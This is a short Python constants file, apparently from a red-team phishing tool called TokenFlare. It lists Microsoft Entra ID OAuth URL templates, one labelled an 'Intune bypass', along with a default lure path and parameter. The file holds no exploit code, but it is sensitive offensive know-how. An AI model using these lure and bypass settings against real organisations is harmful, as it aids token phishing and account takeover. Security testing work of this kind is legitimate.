"""
TokenFlare Library Module
"""

from typing import Dict

# Version information
VERSION = "1.0"
BANNER = """
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄   ▄ ▄▄▄▄▄▄▄ ▄▄    ▄ ▄▄▄▄▄▄▄ ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ 
█       █       █   █ █ █       █  █  █ █       █   █   █       █   ▄  █ █       █
█▄     ▄█   ▄   █   █▄█ █    ▄▄▄█   █▄█ █    ▄▄▄█   █   █   ▄   █  █ █ █ █    ▄▄▄█
  █   █ █  █ █  █      ▄█   █▄▄▄█       █   █▄▄▄█   █   █  █▄█  █   █▄▄█▄█   █▄▄▄ 
  █   █ █  █▄█  █     █▄█    ▄▄▄█  ▄    █    ▄▄▄█   █▄▄▄█       █    ▄▄  █    ▄▄▄█
  █   █ █       █    ▄  █   █▄▄▄█ █ █   █   █   █       █   ▄   █   █  █ █   █▄▄▄ 
  █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█ █▄█▄▄▄▄▄▄▄█▄█  █▄▄█▄▄▄█   █▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄█  █▄█▄▄▄▄▄▄▄█

                                         by Sunny Chau (@gladstomych) JUMPSEC Labs  
                                                                          Dec 2025

""".format(version=VERSION)

# OAuth URL Templates for Entra ID flows
OAUTH_URLS: Dict[str, str] = {
    'officehome': '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145',
    'teams': '/common/oauth2/v2.0/authorize?client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default',
    'intune': '/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default',
}

# OAuth URL Display Names
OAUTH_DISPLAY_NAMES: Dict[str, str] = {
    'officehome': 'OfficeHome (office.com) - Default',
    'teams': 'Teams (teams.microsoft.com)',
    'intune': 'Intune (Microsoft Intune bypass)',
}

# Default lure configuration (used when not explicitly set in wrangler.toml)
DEFAULT_LURE_PATH = '/verifyme'
DEFAULT_LURE_PARAM = 'uuid'
